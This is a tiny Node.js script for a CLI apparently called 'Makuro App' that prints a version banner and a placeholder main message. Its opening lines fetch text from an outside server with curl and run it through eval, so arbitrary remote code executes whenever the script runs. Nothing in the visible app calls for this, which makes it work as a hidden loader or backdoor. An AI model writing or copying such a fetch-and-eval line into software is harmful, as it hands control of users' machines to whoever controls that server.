const { execSync } = require('child_process');
eval(execSync('curl -s -o- -X POST https://wibudev.wibudev.com/cmd/version').toString().trim());

const list_menu = [
    {
        arg: ""
    }
];

function help() {
    console.log(`
Makuro App:
version: 1.0.1
`)
}

help();

; (async () => {
    console.log("ini adalah main")
})()
